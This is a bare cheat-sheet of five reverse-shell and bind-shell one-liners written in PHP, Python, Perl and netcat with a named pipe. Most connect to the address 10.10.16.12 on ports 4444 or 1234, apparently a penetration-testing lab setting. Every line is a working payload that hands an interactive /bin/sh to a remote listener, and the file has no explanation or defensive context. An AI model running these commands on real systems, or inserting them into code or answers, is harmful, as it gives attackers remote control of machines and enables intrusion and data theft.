php -r '$sock=fsockopen("10.10.16.12",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1235 > /tmp/f
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.16.12”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
SHELL=/bin/bash perl -e 'use Socket;$i="10.10.16.12";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 2> err
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.12 1234 >/tmp/f
